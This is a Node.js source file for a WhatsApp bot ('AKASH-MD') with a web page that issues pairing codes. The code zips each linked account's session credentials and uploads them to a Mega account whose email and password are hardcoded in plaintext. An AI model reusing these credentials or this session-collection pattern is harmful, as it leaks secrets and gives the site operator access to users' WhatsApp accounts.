const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason,
    delay
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { Storage } = require('megajs');
const archiver = require('archiver');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

// Bot Configuration
const BOT_NAME = 'AKASH-MD';
const PREFIX = '.';

// Mega Credentials
const MEGA_EMAIL = 'nsithija239@gmail.com';
const MEGA_PASSWORD = '1234@nima5';

let sock;
const AUTH_DIR = path.join(__dirname, 'auth_info');

async function uploadSessionToMega(userJid) {
    try {
        console.log('📦 Creating Session Zip...');
        const zipPath = path.join(__dirname, 'session.zip');
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        archive.pipe(output);
        archive.directory(AUTH_DIR, false);
        await archive.finalize();

        await new Promise((resolve) => output.on('close', resolve));

        console.log('☁️ Uploading Session to Mega...');
        const storage = await new Storage({
            email: MEGA_EMAIL,
            password: MEGA_PASSWORD
        }).ready;

        const file = await storage.upload({
            name: `${BOT_NAME}-session.zip`
        }, fs.createReadStream(zipPath)).complete;

        const megaUrl = await file.link();
        console.log('✅ Session Uploaded Successfully:', megaUrl);

        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        if (sock && userJid) {
            const sessionMsg = `*───────────────────*\n` +
                               `🎉 *${BOT_NAME} CONNECTED SUCCESSFULLY!*\n` +
                               `*───────────────────*\n\n` +
                               `🔑 *Your Session ID / Link:*\n\`\`\`${megaUrl}\`\`\`\n\n` +
                               `📌 *Heroku Deployment Instructions:*\n` +
                               `1. Copy the above Mega URL.\n` +
                               `2. Go to Heroku > Settings > Reveal Config Vars.\n` +
                               `3. Add Key: \`SESSION_ID\` and Value: \`<Paste_Mega_URL>\`\n\n` +
                               `⚠️ *Keep this Session URL private!*`;
            
            await sock.sendMessage(userJid, { text: sessionMsg });
        }

    } catch (err) {
        console.error('❌ Mega Upload Error:', err);
    }
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');

    sock = makeWASocket({
        logger: pino({ level: 'silent' }),
        auth: state,
        printQRInTerminal: false,
        browser: [BOT_NAME, 'Chrome', '1.0.0']
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
            console.log(`🔴 [${BOT_NAME}] Connection Closed. Reconnecting...`);
            if (shouldReconnect) {
                startBot();
            }
        } else if (connection === 'open') {
            console.log(`🟢 [${BOT_NAME}] Connected successfully!`);
            
            const userJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            await delay(3000);
            await uploadSessionToMega(userJid);
        }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;

        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';

        if (!body.startsWith(PREFIX)) return;

        const args = body.slice(PREFIX.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'ping') {
            await sock.sendMessage(from, { text: `🏓 Pong! *${BOT_NAME}* is online.` }, { quoted: msg });
        } else if (command === 'info' || command === 'menu') {
            await sock.sendMessage(from, { 
                text: `🤖 *${BOT_NAME}*\n⚙️ *Prefix:* ${PREFIX}\n🟢 *Status:* Active` 
            }, { quoted: msg });
        }
    });
}

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>${BOT_NAME} - Pairing</title>
            <style>
                body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0b141a; color: #e9edef; margin: 0; }
                .card { background: #111b21; padding: 30px; border-radius: 16px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #222d34; }
                h2 { color: #00a884; margin-bottom: 8px; }
                p { font-size: 14px; color: #8696a0; margin-bottom: 20px; }
                input { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #2a3942; border-radius: 8px; text-align: center; font-size: 16px; background: #202c33; color: white; outline: none; }
                button { background: #00a884; color: #111b21; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 98%; font-weight: bold; }
                .code { font-size: 26px; font-weight: bold; color: #00a884; letter-spacing: 4px; margin-top: 20px; word-break: break-all; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>${BOT_NAME}</h2>
                <p>Enter number with Country Code<br>(e.g. 94771234567)</p>
                <input type="text" id="phone" placeholder="9477XXXXXXX">
                <button onclick="getPair()">Get Pairing Code</button>
                <div class="code" id="result"></div>
            </div>

            <script>
                async function getPair() {
                    const number = document.getElementById('phone').value.trim();
                    const result = document.getElementById('result');
                    if (!number) return alert('Enter a valid phone number!');
                    
                    result.style.color = "#00a884";
                    result.innerText = "Generating Code...";
                    try {
                        const res = await fetch('/pair?num=' + number);
                        const data = await res.json();
                        if (data.code) {
                            result.innerText = data.code;
                        } else {
                            result.style.color = "#ea4335";
                            result.innerText = data.error || "Error!";
                        }
                    } catch (e) {
                        result.style.color = "#ea4335";
                        result.innerText = "Failed to connect!";
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number is required' });

    num = num.replace(/[^0-9]/g, '');

    try {
        if (!sock.authState.creds.registered) {
            await delay(1500);
            const code = await sock.requestPairingCode(num);
            const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
            return res.json({ code: formattedCode });
        } else {
            return res.json({ error: `${BOT_NAME} is already connected!` });
        }
    } catch (err) {
        return res.status(500).json({ error: 'Failed to generate code' });
    }
});

app.listen(PORT, () => {
    console.log(`🌐 Server active on port ${PORT}`);
    startBot();
});

